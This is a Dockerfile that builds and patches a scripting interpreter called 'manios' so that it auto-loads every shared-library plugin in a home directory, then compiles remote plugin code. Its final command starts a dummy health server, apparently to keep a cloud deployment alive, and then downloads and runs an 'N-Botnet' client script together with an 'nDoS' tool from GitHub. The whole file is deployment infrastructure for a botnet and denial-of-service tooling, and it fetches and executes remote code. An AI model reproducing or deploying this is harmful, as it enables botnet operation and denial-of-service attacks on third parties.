FROM ubuntu:22.04

ENV DEBIAN_FRONTEND=noninteractive
ENV TZ=Etc/UTC
ENV TERM=xterm-256color

# Install all required packages
RUN apt update && apt install -y \
    python3 \
    python3-pip \
    curl \
    wget \
    git \
    build-essential \
    sudo \
    && apt clean \
    && rm -rf /var/lib/apt/lists/* \
    && pip3 install websockets

# Clone manios source
RUN git clone --depth=1 https://github.com/anhnoine/n-manios.git /tmp/manios

# ============ PATCH mnos.h ============
RUN cd /tmp/manios \
    && sed -i '/^#include <limits.h>/a #include <dlfcn.h>' src/mnos.h \
    && printf '/* nplugins */\ntypedef struct Val (*MnosExtFn)(struct Val *args, int nargs);\ntypedef struct { const char *name; const char *doc; MnosExtFunc func; } MnosExtFunc;\nvoid nplugins(void);\n' > /tmp/mnos_patch.h \
    && sed -i '/^#include <dlfcn.h>/r /tmp/mnos_patch.h' src/mnos.h \
    && grep -q 'MnosExtFunc' src/mnos.h && echo "[OK] mnos.h patched"

# ============ PATCH mnos_runtime.c ============
RUN cat > /tmp/nplugin_runtime.c << 'NPRTEOF'
/* ======== nplugins ======== */
static void mkdir_p_nplugin(void) {
char b[1024];
snprintf(b, sizeof(b), "%s/.manios/nplugin",
getenv("HOME") ? getenv("HOME") : "/tmp");
char *p = b;
while (*p) { if (*p == '/' && p > b) { *p = 0; mkdir(b, 0755); *p = '/'; } p++; }
mkdir(b, 0755);
}
static void nplugin_load_so(const char *path) {
void *h = dlopen(path, RTLD_NOW);
if (!h) { fprintf(stderr, "[nplugin] dlopen(%s): %s\n", path, dlerror()); return; }
int nfuncs;
MnosExtFunc* (*init)(int*) = (MnosExtFunc*(*)(int*))dlsym(h, "mnos_ext_init");
if (!init) { fprintf(stderr, "[nplugin] no mnos_ext_init in %s\n", path); dlclose(h); return; }
MnosExtFunc *f = init(&nfuncs);
for (int i = 0; i < nfuncs; i++) {
if (nbuiltins < MAX_BUILTIN) {
builtins[nbuiltins].name = strdup(f[i].name);
builtins[nbuiltins].func = f[i].func;
nbuiltins++;
}
}
}
static Val bi_load_ext(Val *a, int n) {
if (n < 1 || a[0].type != V_STR) return val_none();
nplugin_load_so(a[0].sval);
return val_none();
}
static Val bi_list_ext(Val *a, int n) {
(void)a; (void)n;
Val r = val_list();
char buf[1024];
snprintf(buf, sizeof(buf), "%s/.manios/nplugin",
getenv("HOME") ? getenv("HOME") : "/tmp");
DIR *d = opendir(buf);
if (!d) return r;
struct dirent *e;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
if (r.llen >= r.lcap) { r.lcap *= 2; r.li = realloc(r.li, sizeof(Val) * r.lcap); }
r.li[r.llen++] = val_str(e->d_name);
}
closedir(d);
return r;
}
static Val bi_nplugin_dir(Val *a, int n) {
(void)a; (void)n;
char buf[1024];
snprintf(buf, sizeof(buf), "%s/.manios/nplugin",
getenv("HOME") ? getenv("HOME") : "/tmp");
return val_str(buf);
}
void nplugins(void) {
mkdir_p_nplugin();
reg_builtin("load_ext", bi_load_ext);
reg_builtin("list_ext", bi_list_ext);
reg_builtin("nplugin_dir", bi_nplugin_dir);
const char *home = getenv("HOME") ? getenv("HOME") : "";
if (!home[0]) return;
char buf[1024];
snprintf(buf, sizeof(buf), "%s/.manios/nplugin", home);
DIR *d = opendir(buf);
if (!d) return;
char path[2048];
struct dirent *e;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
const char *n = e->d_name;
int nl = (int)strlen(n);
if (nl > 3 && n[nl-3]=='.' && n[nl-2]=='s' && n[nl-1]=='o') {
snprintf(path, sizeof(path), "%s/%s", buf, n);
nplugin_load_so(path);
}
}
closedir(d);
}
NPRTEOF

# Patch mnos_runtime.c — append nplugin code at end of file (file is minified, can't use line numbers)
RUN cd /tmp/manios \
    && sed -i '1i#include <dlfcn.h>' src/mnos_runtime.c \
    && cat /tmp/nplugin_runtime.c >> src/mnos_runtime.c \
    && grep -q 'nplugins' src/mnos_runtime.c && echo "[OK] mnos_runtime.c patched"

# ============ PATCH mnos_main.c ============
RUN cd /tmp/manios \
    && sed -i '/return mnos_run_file/i nplugins();' src/mnos_main.c \
    && grep -q 'nplugins()' src/mnos_main.c && echo "[OK] mnos_main.c patched"

# ============ PATCH Makefile ============
RUN cd /tmp/manios \
    && sed -i 's/^LDFLAGS ?= -lm$/LDFLAGS ?= -lm -ldl -rdynamic/' Makefile \
    && grep -q 'rdynamic' Makefile && echo "[OK] Makefile patched"

# ============ BUILD manios ============
RUN cd /tmp/manios && make && echo "[OK] manios built"

# ============ INSTALL ============
RUN cp /tmp/manios/manios /usr/local/bin/manios \
    && ln -sf /usr/local/bin/manios /usr/local/bin/mno \
    && mkdir -p /usr/local/share/manios/include \
    && cp /tmp/manios/src/mnos.h /usr/local/share/manios/include/ \
    && echo "[OK] manios installed"

# ============ HEADER mnos_ext.h ============
RUN cat > /usr/local/share/manios/include/mnos_ext.h << 'EXTEOF'
#ifndef MNOS_EXT_H
#define MNOS_EXT_H
#include "mnos.h"
#define MNOS_EXT_EXPORT __attribute__((visibility("default")))
#define MNOS_EXT_BEGIN(extname) \
MNOS_EXT_EXPORT MnosExtFunc* mnos_ext_init(int *nfuncs) { \
static MnosExtFunc funcs[] = {
#define MNOS_EXT_FUNC(fname,cfunc,desc) { (fname),(desc),(cfunc) },
#define MNOS_EXT_END \
{NULL,NULL,NULL} }; \
*nfuncs=(int)(sizeof(funcs)/sizeof(MnosExtFunc))-1; return funcs; }
#endif
EXTEOF

# ============ PLUGIN DIR ============
RUN mkdir -p /root/.manios/nplugin

# ============ COMPILE nplugin ============
RUN curl -sL https://raw.githubusercontent.com/anhnoine/n-manios/main/nPlugins/nplugin.c -o /tmp/nplugin.c \
    && gcc -shared -fPIC -I/usr/local/share/manios/include -o /root/.manios/nplugin/nplugin.so /tmp/nplugin.c -lpthread \
    && gcc -DNPLUGIN_CLI -o /usr/local/bin/nplugin /tmp/nplugin.c -lpthread \
    && chmod +x /usr/local/bin/nplugin \
    && echo "[OK] nplugin compiled"

# ============ COMPILE plugins ============
RUN curl -sL https://raw.githubusercontent.com/anhnoine/n-manios/refs/heads/main/nPlugins/plugins/nSocks.c -o /tmp/nSocks.c \
    && curl -sL https://raw.githubusercontent.com/anhnoine/n-manios/refs/heads/main/nPlugins/plugins/n-args.c -o /tmp/n-args.c \
    && gcc -shared -fPIC -I/usr/local/share/manios/include -o /root/.manios/nplugin/nSocks.so /tmp/nSocks.c -lpthread \
    && gcc -shared -fPIC -I/usr/local/share/manios/include -o /root/.manios/nplugin/n-args.so /tmp/n-args.c -lpthread \
    && chmod +x /root/.manios/nplugin/*.so \
    && echo "[OK] plugins compiled"

# ============ CLEANUP ============
RUN rm -rf /tmp/manios /tmp/nplugin.c /tmp/nSocks.c /tmp/n-args.c /tmp/nplugin_runtime.c /tmp/mnos_patch.h

WORKDIR /root/n-botnet

# Health server ($PORT for Railway) + download client + run botnet
CMD ["bash", "-c", "python3 -m http.server ${PORT:-8080} --directory /tmp &> /dev/null & sleep 1 \
    && wget -q https://raw.githubusercontent.com/anhnoine/N-Botnet/refs/heads/main/client/client.py \
    && wget -q https://raw.githubusercontent.com/anhnoine/nDoS/refs/heads/main/tools/nDoS.mno \
    && python3 client.py"]
